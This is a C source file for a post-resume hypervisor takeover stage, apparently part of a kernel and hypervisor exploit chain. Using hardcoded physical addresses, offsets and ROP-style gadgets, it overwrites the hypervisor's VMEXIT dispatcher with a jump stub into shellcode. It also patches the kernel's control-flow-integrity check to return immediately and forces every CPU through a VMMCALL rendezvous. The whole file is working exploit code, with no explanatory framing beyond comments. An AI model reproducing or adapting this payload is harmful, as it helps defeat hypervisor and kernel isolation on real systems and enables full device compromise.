/*
 * Post-resume hypervisor takeover blob (runs on the BSP in kernel context).
 *
 * Entered after resume via a khook resume_rip redirect installed on
 * SYS_GETUID. Arguments:
 *   rdi = kernel text base (ktext)
 *   rsi = direct-map base (dmap, i.e. kdldmap(0))
 *
 * With NPT already disabled by the pre-suspend break_hv payload, the direct
 * map addresses HV physical memory. We patch the HV VMEXIT dispatcher so the
 * first VMMCALL hands control to shellcode_hv (running on the identity map),
 * disable the kernel CFI check, then force every logical CPU through a
 * rendezvous whose action callback is a bare VMMCALL. This blob never
 * returns.
 */
#include <stdint.h>

#define HV_HANDLE_VMEXIT_PA   0x62846c00ULL

#define CAVE_HV_PAGING        0x100000000ULL
#define CAVE_HV_CODE          0x100003000ULL

#define OFF_KERNEL_CFI_CHECK  0x44e5d0ULL
#define OFF_FUN_SMP_RENDEZVOUS 0xaf94e0ULL

#define OFF_GADGET_RET        0x291232ULL   /* bare `ret` */
#define OFF_GADGET_VMMCALL    0xc09e49ULL   /* `vmmcall` (tail never runs) */

__attribute__((section(".entry_point"), noreturn))
void takeover(uint64_t ktext, uint64_t dmap)
{
  volatile uint8_t *vme = (volatile uint8_t *)(uintptr_t)(dmap + HV_HANDLE_VMEXIT_PA);

  /* movabs rax, CAVE_HV_PAGING ; mov cr3, rax ; movabs rax, CAVE_HV_CODE ; jmp rax */
  uint8_t stub[25];
  stub[0]  = 0x48;
  stub[1]  = 0xb8;
  *(uint64_t *)(void *)&stub[2]  = CAVE_HV_PAGING;
  stub[10] = 0x0f;
  stub[11] = 0x22;
  stub[12] = 0xd8;
  stub[13] = 0x48;
  stub[14] = 0xb8;
  *(uint64_t *)(void *)&stub[15] = CAVE_HV_CODE;
  stub[23] = 0xff;
  stub[24] = 0xe0;

  for (int i = 0; i < 25; i++)
    vme[i] = stub[i];

  /* Disable the kernel CFI check so the raw function-pointer callbacks pass. */
  *(volatile uint8_t *)(uintptr_t)(ktext + OFF_KERNEL_CFI_CHECK) = 0xc3;

  /* Kick every CPU into a raw VMMCALL; each VMEXIT lands in shellcode_hv. */
  void (*smp_rendezvous)(void *, void *, void *, void *) =
      (void (*)(void *, void *, void *, void *))(uintptr_t)(ktext + OFF_FUN_SMP_RENDEZVOUS);
  smp_rendezvous((void *)(uintptr_t)(ktext + OFF_GADGET_RET),
                 (void *)(uintptr_t)(ktext + OFF_GADGET_VMMCALL),
                 (void *)(uintptr_t)(ktext + OFF_GADGET_RET), 0);

  for (;;)
    ;
}
